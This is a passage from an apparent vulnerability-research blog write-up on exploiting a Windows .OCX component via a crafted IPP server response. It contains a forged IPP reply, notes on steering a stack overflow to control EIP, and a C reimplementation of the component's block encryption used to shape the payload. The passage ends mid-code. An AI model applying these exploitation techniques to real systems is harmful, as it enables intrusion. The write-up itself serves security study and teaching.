</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |          attribute-with-one-value           |  q bytes
</span></span><span class="line"><span class="cl">   ----------------------------------------------------------
</span></span><span class="line"><span class="cl">   |             additional-value                |  r bytes |- 0 or more
</span></span><span class="line"><span class="cl">   ----------------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                       Figure 3: Attribute Encoding
</span></span></code></pre></div><p>I will not explain the IPP protocol here, but <strong>this RFC helped me to add a new attribute</strong> in my IPP answer:</p>
<pre tabindex="0"><code>HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 97
Content-Type: application/ipp
Date: Sat, 13 Jul 2019 21:53:39 GMT
Keep-Alive: timeout=10
Accept-Encoding: gzip, deflate, identity Server: IPPSAMPLE/1.0b1
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors &#39;none&#39;

Gattributes-charsetutf-8Httributes-natural-languageen-usDserver-version1.1
</code></pre><p>Whose hexadecimal dump is:</p>
<pre tabindex="0"><code>[...]
00000160: 2d6c 616e 6775 6167 6500 0565 6e2d 7573 -language..en-us
00000170: 4400 0e73 6572 7665 722d 7665 7273 696f D..server-versio
00000180: 6e00 0331 2e31 030d 0a                  n..1.1...
[...]
</code></pre><p>By setting the right delimiters (and a random value-tag), my new attribute was added and <strong>correctly received</strong> by the server.</p>
<div class="details admonition question open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">But then, it seems like I missed something in my answer because a crash occured on a <strong>strlen</strong> function that received <strong>NULL</strong> no matter what I did. I tried to add more attributes, add data field, but <strong>this function was still crashing</strong>.</div>
        </div>
    </div>
<p>When I planned to reverse the whole previous function to check what I missed, I dropped it because I found an easier solution (the logic bug I explained in the write-up earlier).</p>
<p>Now let&rsquo;s get to the other path in the exploitation part.</p>
<h3 id="52-the-ciphertext-buffer-overflow">5.2. The ciphertext buffer overflow</h3>
<p>Here, we get back to the part where I said:</p>
<blockquote>
<p>In such cases, we got two possibilites:</p>
<ul>
<li>Either we went <strong>too far</strong> by overflowing (in that case, we must try with a shorter payload)</li>
<li>Or <strong>not enough</strong> (there, we can try a longer payload and eventually <strong>fix it</strong> to avoid the crashes happening before the EIP crash by <strong>writing valid addresses instead of A&rsquo;s</strong>). This is a known method in exploitation: if your program crashes <strong>before</strong> reaching the saved EIP in stack, simply <strong>fix the crash</strong> by providing the program the minimum requirement to <strong>not crash</strong>: like a random <strong>valid address</strong>. You do not really care what it will do with it because you know you will <strong>take control of the execution flow</strong>.</li>
</ul>
<p>In our case, we&rsquo;re already limited by the checks in the .OCX file: <strong>we cannot go beyond 0x200 bytes</strong>.
So let&rsquo;s try with a shorter string.</p>
</blockquote>
<p>The mistake I made was trying a <strong>too short string</strong>, that led me to the <strong>wrong path</strong>. To sum up, a function takes the <strong>realm</strong> field as parameter, then applies an <strong>encryption process</strong> on it, based on a huge <strong>static key stored in memory</strong>.</p>
<p>It&rsquo;s a <strong>bloc by bloc encryption</strong> process (by blocks of 8 bytes), so if the first bloc of 8 bytes is modified, the <strong>whole ciphertext changes</strong>.</p>
<p><strong>I managed to reproduce the whole encryption function</strong> in C and try it locally:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;the_key.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//unsigned char key[8] = {0xf1, 0x80, 0x39, 0xd6, 0x88, 0xd3, 0xbe, 0x64};
</span></span></span><span class="line"><span class="cl"><span class="c1">//unsigned char key[8] = {0x52, 0x74, 0x84, 0x0f, 0xf9, 0xb7, 0xc6, 0x2a};
</span></span></span><span class="line"><span class="cl"><span class="c1">//unsigned char key[8] = {0x6f, 0x04, 0x6e, 0x4b, 0x81, 0x49, 0xa7, 0xca};
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key_part1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key_part2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">newbuf</span><span class="p">[</span><span class="mi">8192</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">realbuf</span><span class="p">[</span><span class="mi">8192</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">shift_on_key</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">tmp_bloc</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index_tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ebx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">index_tmp</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp_bloc</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">special_bloc_1</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="p">(</span><span class="n">index_tmp</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">index_tmp</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp_bloc</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x448</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">special_bloc_2</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span><span class="p">(</span><span class="n">index_tmp</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">index_tmp</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp_bloc</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x848</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">special_bloc_3</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="p">(</span><span class="n">index_tmp</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">index_tmp</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp_bloc</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0xc48</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">special_bloc_4</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="p">(</span><span class="n">index_tmp</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ebx</span> <span class="o">=</span> <span class="n">special_bloc_2</span> <span class="o">+</span> <span class="n">special_bloc_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ebx</span> <span class="o">^=</span> <span class="n">special_bloc_3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ebx</span> <span class="o">+=</span> <span class="n">special_bloc_4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ebx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_new_key</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">old_key</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">the_key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index_tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_1_oldkey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">old_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_2_oldkey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">old_key</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_1_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_2_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_3_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_4_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_5_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_6_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_7_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_8_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_9_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_10_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_11_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_12_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">11</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_13_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_14_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_15_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_16_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_17_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bloc_18_thekey</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">the_key</span> <span class="o">+</span> <span class="mi">17</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">tmp_bloc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ebx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">edx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">edi</span> <span class="o">=</span> <span class="n">bloc_1_oldkey</span> <span class="o">^</span> <span class="n">bloc_1_thekey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">esi</span> <span class="o">=</span> <span class="n">bloc_2_oldkey</span> <span class="o">^</span> <span class="n">bloc_2_thekey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">tmp_bloc</span> <span class="o">=</span> <span class="n">edi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ebx</span> <span class="o">=</span> <span class="nf">shift_on_key</span><span class="p">(</span><span class="n">tmp_bloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">esi</span> <span class="o">^=</span> <span class="n">ebx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">edx</span> <span class="o">=</span> <span class="n">bloc_3_thekey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edi</span> <span class="o">^=</span> <span class="n">edx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">tmp_bloc</span> <span class="o">=</span> <span class="n">esi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ebx</span> <span class="o">=</span> <span class="nf">shift_on_key</span><span class="p">(</span><span class="n">tmp_bloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">edi</span> <span class="o">^=</span> <span class="n">ebx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">edx</span> <span class="o">=</span> <span class="n">bloc_4_thekey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">esi</span> <span class="o">^=</span> <span class="n">edx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">tmp_bloc</span> <span class="o">=</span> <span class="n">esi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ebx</span> <span class="o">=</span> <span class="nf">shift_on_key</span><span class="p">(</span><span class="n">tmp_bloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">edi</span> <span class="o">^=</span> <span class="n">ebx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">edx</span> <span class="o">=</span> <span class="n">bloc_18_thekey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">esi</span> <span class="o">^=</span> <span class="n">edx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key_part1</span> <span class="o">=</span> <span class="n">esi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_part2</span> <span class="o">=</span> <span class="n">edi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">entry</span> <span class="o">=</span> <span class="n">av</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">get_new_key</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">the_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part1</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part1</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part1</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part2</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part2</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part2</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">?</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">key_part2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">get_new_key</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">the_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
